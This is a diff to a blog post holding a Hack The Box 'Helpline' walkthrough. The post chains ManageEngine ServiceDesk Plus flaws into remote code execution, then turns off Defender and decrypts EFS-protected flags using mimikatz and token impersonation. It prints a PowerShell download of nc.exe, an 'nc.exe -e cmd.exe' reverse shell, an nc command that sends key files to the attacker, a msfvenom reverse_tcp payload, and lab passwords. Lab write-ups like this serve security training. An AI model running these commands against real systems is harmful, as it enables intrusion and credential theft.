@@ -2,17 +2,18 @@
 layout: post
 title: Hack The Box - Helpline
 categories: hack-the-box
-tags: [Windows, Web, RCE, Cryptography, Windows Exploitation]
+tags: [windows, web, rce, cryptography, windows-exploitation]
+description: My write-up for Helpline from Hack The Box.
 image: /hackthebox/helpline/0.png
 ---
 
 <hr>
-### Quick Summary
-#### Hey guys today Helpline retired and here's my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as `nt authority/system` which means that I technically rooted the box. But the flags were `EFS` encrypted so I had to find a way to read them. It's a Windows box and its ip is `10.10.10.152`, I added it to `/etc/hosts` as `helpline.htb`. Let's jump right in !
+## Quick Summary
+<br> Hey guys today Helpline retired and here's my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as `nt authority/system` which means that I technically rooted the box. But the flags were `EFS` encrypted so I had to find a way to read them. It's a Windows box and its ip is `10.10.10.152`, I added it to `/etc/hosts` as `helpline.htb`. Let's jump right in !
 ![](/images/hackthebox/helpline/0.png)
 <hr>
-### Nmap
-#### As always we will start with `nmap` to scan for open ports and services :
+## Nmap
+<br> As always we will start with `nmap` to scan for open ports and services :
 ```
 # Nmap 7.70 scan initiated Thu Aug 15 20:55:21 2019 as: nmap -sV -sT -sC -o nmapinitial helpline.htb
 Nmap scan report for helpline.htb (10.10.10.132)
@@ -118,7 +119,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Aug 15 20:58:04 2019 -- 1 IP address (1 host up) scanned in 162.71 seconds
 
 ```
-#### We got `http` on port 8080 and `smb`. I tried to list `smb` shares but I couldn't authenticate anonymously :
+<br> We got `http` on port 8080 and `smb`. I tried to list `smb` shares but I couldn't authenticate anonymously :
 ```
 root@kali:~/Desktop/HTB/boxes/helpline# smbclient --list //helpline.htb/ -U ""
 Enter WORKGROUP\'s password: 
@@ -126,15 +127,15 @@ session setup failed: NT_STATUS_LOGON_FAILURE
 ```
 <br>
 <hr>
-### HTTP Initial Enumeration, Administrative Access
-#### On the `http` port there was an application called `ManageEngine ServiceDesk Plus`.
+## HTTP Initial Enumeration, Administrative Access
+<br> On the `http` port there was an application called `ManageEngine ServiceDesk Plus`.
 ![](/images/hackthebox/helpline/1.png)
-#### I tried some common credentials like `admin:admin` and `guest:guest` which actually worked :
+<br> I tried some common credentials like `admin:admin` and `guest:guest` which actually worked :
 ![](/images/hackthebox/helpline/2.png)
 <br>
 <br>
 ![](/images/hackthebox/helpline/3.png)
-#### But as `guest` my capabilities were limited so I had to elevate to an administrative user. I searched for known vulnerabilities for this application and found this [authentication bypass vulnerability](https://www.exploit-db.com/exploits/42037). However to exploit it I needed a valid username :
+<br> But as `guest` my capabilities were limited so I had to elevate to an administrative user. I searched for known vulnerabilities for this application and found this [authentication bypass vulnerability](https://www.exploit-db.com/exploits/42037). However to exploit it I needed a valid username :
 ![](/images/hackthebox/helpline/4.png)
 <br>
 <br>
@@ -142,14 +143,14 @@ session setup failed: NT_STATUS_LOGON_FAILURE
 <br>
 <br>
 ![](/images/hackthebox/helpline/6.png)
-#### luckily there was another [user enumeration vulnerability](https://www.exploit-db.com/exploits/35891) which I could exploit as `guest`. 
+<br> luckily there was another [user enumeration vulnerability](https://www.exploit-db.com/exploits/35891) which I could exploit as `guest`. 
 ![](/images/hackthebox/helpline/7.png)
 <br>
 <br>
 ![](/images/hackthebox/helpline/8.png)
-#### Before using `wfuzz` with a long wordlist I tried some common usernames first, `administrator` was an existing user :
+<br> Before using `wfuzz` with a long wordlist I tried some common usernames first, `administrator` was an existing user :
 ![](/images/hackthebox/helpline/9.png)
-#### To exploit the authentication bypass vulnerability we have to login as `guest`, then navigate to `/mc` and logout. After that we will login as `administrator`  by using `administrator` as username and password then return to the index page again and we will be redirected to the dashboard as `administrator`.
+<br> To exploit the authentication bypass vulnerability we have to login as `guest`, then navigate to `/mc` and logout. After that we will login as `administrator`  by using `administrator` as username and password then return to the index page again and we will be redirected to the dashboard as `administrator`.
 ![](/images/hackthebox/helpline/10.png)
 <br>
 <br>
@@ -163,39 +164,39 @@ session setup failed: NT_STATUS_LOGON_FAILURE
 <br>
 <br>
 ![](/images/hackthebox/helpline/14.png)
-#### There is also a published [exploit](https://www.exploit-db.com/exploits/46659) that does the same thing automatically :
+<br> There is also a published [exploit](https://www.exploit-db.com/exploits/46659) that does the same thing automatically :
 ![](/images/hackthebox/helpline/15.png)
 <hr>
-### RCE
-#### I checked the `Admin` section and `Custom Triggers` under `Helpdesk Customizer` caught my attention.
+## RCE
+<br> I checked the `Admin` section and `Custom Triggers` under `Helpdesk Customizer` caught my attention.
 ![](/images/hackthebox/helpline/16.png)
 <br>
 <br>
 ![](/images/hackthebox/helpline/17.png)
-#### Description says : "You can define rules to automatically invoke any custom class or script file. The action rules can be applied to a request when it is created, (or received) or edited or both"
-#### I ran a python `http` server to host `nc.exe` then I created a trigger that executes : 
+<br> Description says : "You can define rules to automatically invoke any custom class or script file. The action rules can be applied to a request when it is created, (or received) or edited or both"
+<br> I ran a python `http` server to host `nc.exe` then I created a trigger that executes : 
 ```
 powershell -command Invoke-WebRequest http://10.10.xx.xx/nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe
 ```
-#### When a request is created (it must has the word `test` in the subject).
+<br> When a request is created (it must has the word `test` in the subject).
 ![](/images/hackthebox/helpline/18.png)
 <br>
 <br>
 ![](/images/hackthebox/helpline/19.png)
-#### Last thing to do is to create a request that runs the trigger :
+<br> Last thing to do is to create a request that runs the trigger :
 ![](/images/hackthebox/helpline/20.png)
 <br>
 <br>
 ![](/images/hackthebox/helpline/21.png)
-#### I edited the trigger and made it execute :
+<br> I edited the trigger and made it execute :
 ```
 C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.xx.xx 1337
 ```
-#### Then I created another request and got a reverse shell as `nt authority\system` :
+<br> Then I created another request and got a reverse shell as `nt authority\system` :
 ![](/images/hackthebox/helpline/22.png)
 <hr>
-### Encrypted Flags
-#### Although I was `system` I couldn't read the flags :
+## Encrypted Flags
+<br> Although I was `system` I couldn't read the flags :
 ```
 E:\ManageEngine\ServiceDesk\integration\custom_scripts>c:                         
 c:              
@@ -234,7 +235,7 @@ C:\Users\tolu\Desktop>type user.txt
 type user.txt
 Access is denied.
 ```
-#### That's because the flags are `EFS` encrypted :
+<br> That's because the flags are `EFS` encrypted :
 ```
 C:\Users\Administrator\Desktop>cipher /c root.txt
 cipher /c root.txt
@@ -280,12 +281,12 @@ The specified file could not be decrypted.
 
 C:\Users\Administrator\Desktop>
 ```
-#### To decrypt them we need `Administrator`'s password for `root.txt` and `tolu`'s password for `user.txt`. First time I solved this box I got the root flag first as it was easier but for the write-up I'll do user flag first.
+<br> To decrypt them we need `Administrator`'s password for `root.txt` and `tolu`'s password for `user.txt`. First time I solved this box I got the root flag first as it was easier but for the write-up I'll do user flag first.
 <br>
 <hr>
-### user.txt
-#### Since we need passwords, first thing I did was to put [`mimikatz`](https://github.com/gentilkiwi/mimikatz) on the box and dump the password hashes.
-#### But before that I had to disable :
+## user.txt
+<br> Since we need passwords, first thing I did was to put [`mimikatz`](https://github.com/gentilkiwi/mimikatz) on the box and dump the password hashes.
+<br> But before that I had to disable :
 ```
 PS C:\Users\Administrator\Desktop> Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -361,9 +362,9 @@ RID  : 000003f3 (1011)
 User : tolu
   Hash NTLM: 03e2ec7aa7e82e479be07ecd34f1603b
 ```
-#### The only crackable hash was `zachary`'s :
+<br> The only crackable hash was `zachary`'s :
 ![](/images/hackthebox/helpline/23.png)
-#### But what can we do with `zachary` ?
+<br> But what can we do with `zachary` ?
 ```
 PS C:\windows\system32\spool\drivers\color> net users zachary
 net users zachary
@@ -393,14 +394,14 @@ Local Group Memberships      *Event Log Readers    *Users
 Global Group memberships     *None
 The command completed successfully.
 ```
-#### `zachary` is a member of a local group called `Event Log Readers`, maybe there is something in the event log, I queried the event log with `wevtutil` and saved the output in a file :
+<br> `zachary` is a member of a local group called `Event Log Readers`, maybe there is something in the event log, I queried the event log with `wevtutil` and saved the output in a file :
 ```
 C:\Windows\System32\spool\drivers\color>wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 > eventlog.txt                                                                        
 wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321 > eventlog.txt
 
 C:\Windows\System32\spool\drivers\color>
 ```
-#### The output was a very long one so I searched for interesting stuff like usernames, by searching  for `tolu` I got this `net use` command which had `tolu's` password :
+<br> The output was a very long one so I searched for interesting stuff like usernames, by searching  for `tolu` I got this `net use` command which had `tolu's` password :
 ```
 C:\Windows\System32\spool\drivers\color>type eventlog.txt | findstr tolu                                                                   
 type eventlog.txt | findstr tolu                                                                                                           
@@ -429,8 +430,8 @@ Logon Account:  tolu
         Account Name:           tolu
 
 ```
-#### `tolu : !zaq1234567890pl!99`
-#### `tolu` is in the `Remote Management Users` local group :
+<br> `tolu : !zaq1234567890pl!99`
+<br> `tolu` is in the `Remote Management Users` local group :
 ```
 C:\Windows\System32\spool\drivers\color>net users tolu
 net users tolu
@@ -460,11 +461,11 @@ Local Group Memberships      *Remote Management Use*Users
 Global Group memberships     *None                 
 The command completed successfully.
 ```
-#### And `winrm`'s port is open :
+<br> And `winrm`'s port is open :
 ![](/images/hackthebox/helpline/24.png)
-#### So I thought of authenticating as `tolu` to read the flag (I used [`evilwinrm`](https://github.com/Hackplayers/evil-winrm))
+<br> So I thought of authenticating as `tolu` to read the flag (I used [`evilwinrm`](https://github.com/Hackplayers/evil-winrm))
 ![](/images/hackthebox/helpline/25.png)
-#### But I still couldn't read the flag ...
+<br> But I still couldn't read the flag ...
 ```
 *Evil-WinRM* PS C:\Users\tolu\Desktop> type user.txt
 Access to the path 'C:\Users\tolu\Desktop\user.txt' is denied.
@@ -474,8 +475,8 @@ At line:1 char:1
     + CategoryInfo          : PermissionDenied: (C:\Users\tolu\Desktop\user.txt:String) [Get-Content], UnauthorizedAccessException
     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
 ```
-#### I found this [guide](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) to decrypt `EFS` files with `mimikatz`, by following it I was able to decrypt the user flag.
-#### We need to get the certificate and decrypt the master/private keys (details in the guide mentioned above) :
+<br> I found this [guide](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) to decrypt `EFS` files with `mimikatz`, by following it I was able to decrypt the user flag.
+<br> We need to get the certificate and decrypt the master/private keys (details in the guide mentioned above) :
 ```
 mimikatz # crypto::system /file:"C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29" /export                                                                               
 * File: 'C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29'                                                                                      
@@ -721,7 +722,7 @@ fcf11fea675cc8c1a1dcc79da2e3ec931f8fe342fecef6c883649e86cfda7d34cc01e0a128424df5
         Key size       : 2048
         Private export : OK - 'raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk'
 ```
-#### I used `nc` to transfer the `der` and `pvk` files to my box :
+<br> I used `nc` to transfer the `der` and `pvk` files to my box :
 ```
 C:\Windows\System32\spool\drivers\color>nc.exe -w 3 10.10.xx.xx 1440 < 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
 nc.exe -w 3 10.10.xx.xx 1440 < 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
@@ -747,16 +748,16 @@ drwxr-xr-x 6 root root 4096 Aug 16 16:50 ..
 -rw-r--r-- 1 root root  765 Aug 16 16:50 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
 -rw-r--r-- 1 root root 1196 Aug 16 16:51 raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk
 ```
-#### Then I created the `pfx` with `openssl` :
+<br> Then I created the `pfx` with `openssl` :
 ```
 root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem
 root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk -out private.pem
 writing RSA key
 root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
-#### And finally I imported it and I was able to read the flag :
+<br> And finally I imported it and I was able to read the flag :
 ![](/images/hackthebox/helpline/26.png)
-#### I found later that I could also use `Invoke-Command` as `tolu` and I would be able to read the flag, still don't know why I couldn't read it from a `winrm` session.
+<br> I found later that I could also use `Invoke-Command` as `tolu` and I would be able to read the flag, still don't know why I couldn't read it from a `winrm` session.
 ```
 PS C:\Windows\System32\spool\drivers\color> $username = "Helpline\tolu"
 $username = "Helpline\tolu"
@@ -770,11 +771,11 @@ PS C:\Windows\System32\spool\drivers\color> Invoke-Command -ComputerName HELPLIN
 Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
 ```
 ![](/images/hackthebox/helpline/27.png)
-#### We got user.
+<br> We got user.
 <br>
 <hr>
-### root.txt
-#### There was a file called `admin-pass.xml` in `C:\Users\leo\Desktop`
+## root.txt
+<br> There was a file called `admin-pass.xml` in `C:\Users\leo\Desktop`
 ```
 C:\Users\leo\Desktop>dir
 dir
@@ -793,11 +794,11 @@ C:\Users\leo\Desktop>type admin-pass.xml
 type admin-pass.xml
 Access is denied.
 ```
-#### Only `leo` can read it. `leo's` hash was uncrackable so I looked for other ways to be `leo`. I wanted to see if I can impersonate `leo`'s token so I created a `metasploit` payload and got a `meterpreter` session.
+<br> Only `leo` can read it. `leo's` hash was uncrackable so I looked for other ways to be `leo`. I wanted to see if I can impersonate `leo`'s token so I created a `metasploit` payload and got a `meterpreter` session.
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1441 -f exe > m.exe
 ```
-#### And yes, I could impersonate `leo`'s token :
+<br> And yes, I could impersonate `leo`'s token :
 ```
 meterpreter > load incognito 
 Loading extension incognito...Success.
@@ -833,7 +834,7 @@ helpline\leo
 
 C:\Windows\System32\spool\drivers\color>
 ```
-#### Now we can read `admin-pass.xml` :
+<br> Now we can read `admin-pass.xml` :
 ```
 C:\Windows\System32\spool\drivers\color>cd c:\users\leo\desktop
 cd c:\users\leo\desktop
@@ -857,7 +858,7 @@ type admin-pass.xml
 
 c:\Users\leo\Desktop>
 ```
-#### I used `Invoke-Command` again and used `Get-Content` to read `admin-pass.xml` instead of putting the password in a variable.
+<br> I used `Invoke-Command` again and used `Get-Content` to read `admin-pass.xml` instead of putting the password in a variable.
 ```
 c:\Users\leo\Desktop>powershell
 powershell
@@ -874,12 +875,12 @@ PS C:\Users\leo\Desktop> Invoke-Command -ComputerName HELPLINE -Credential $cred
 Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}
 ```
 ![](/images/hackthebox/helpline/28.png)
-#### We owned root !
-#### That's it , Feedback is appreciated !
-#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
-#### Thanks for reading.
+<br> We owned root !
+<br> That's it , Feedback is appreciated !
+<br> Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
+<br> Thanks for reading.
 <br>
 <br>
-#### Previous Hack The Box write-up : [Hack The Box - Arkham](/hack-the-box/arkham/)
-#### Next Hack The Box write-up : [Hack The Box - Unattended](/hack-the-box/unattended/)
+<br> Previous Hack The Box write-up : [Hack The Box - Arkham](/hack-the-box/arkham/)
+<br> Next Hack The Box write-up : [Hack The Box - Unattended](/hack-the-box/unattended/)
 <hr>
